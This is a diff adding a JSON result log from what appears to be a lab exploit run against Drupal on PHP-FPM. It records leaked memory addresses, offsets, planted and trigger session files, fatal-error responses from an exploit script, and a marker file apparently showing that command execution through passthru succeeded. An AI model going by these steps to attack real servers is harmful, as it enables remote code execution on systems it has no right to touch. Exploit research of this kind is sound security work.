@@ -1,0 +1,55 @@
+{
+ "worker0": 162111,
+ "P": 140043493056512,
+ "X": 140043492982784,
+ "S": 140043493068824,
+ "target": 36459720,
+ "zif": 10731636,
+ "geo": {
+  "p_off": 73704,
+  "d_off": 73840,
+  "K": -8752716037309,
+  "F": 140043493069336,
+  "NAME_LEN": 81908,
+  "S": 140043493068824
+ },
+ "name_pipe": 81908,
+ "cmd_len": 73,
+ "marker_before": false,
+ "plant_seed": {
+  "path": "/tmp/opencode/drupaldx/sites/default/files/php/sessions/sess_pl1",
+  "len": 64946,
+  "sha1": "98a78b4ac579ac102ea712e7bcd0b7c7a60014bc"
+ },
+ "trigger_seed": {
+  "path": "/tmp/opencode/drupaldx/sites/default/files/php/sessions/sess_tb1",
+  "len": 81920,
+  "sha1": "c2fbd4e14fae30152b17c1a32a70b42db671bfad"
+ },
+ "plant": {
+  "status": 200,
+  "head": "<br />\n<b>Fatal error</b>:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 20480 bytes) in <b>/tmp/opencode/research/drupal_fpm_20261022T013000Z/www/exploit/sess.php</b> on line <b>"
+ },
+ "worker_after_plant": 162111,
+ "trigger": {
+  "status": 200,
+  "head": "<br />\n<b>Fatal error</b>:  Uncaught ArgumentCountError: session_start() expects at least 1 argument, 0 given in /tmp/opencode/research/drupal_fpm_20261022T013000Z/www/exploit/sess.php:2\nStack trace:\n#0 /tmp/opencode/research/drupal_fpm_20261022T013000Z/www/exploit/sess.php(2): session_start()\n#1 {m"
+ },
+ "marker_after_trigger": true,
+ "marker": {
+  "path": "/tmp/opencode/research/drupal_fpm_20261022T013000Z/MARKER_PASSTHRU",
+  "size": 0,
+  "mtime_ns": 1792626891654183661
+ },
+ "worker_after_trigger": 162111,
+ "health": {
+  "status": 200,
+  "head": "health-ok\n"
+ },
+ "worker_after_health": 162111,
+ "file": {
+  "len": 0,
+  "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+  "head": ""
+ }
+}
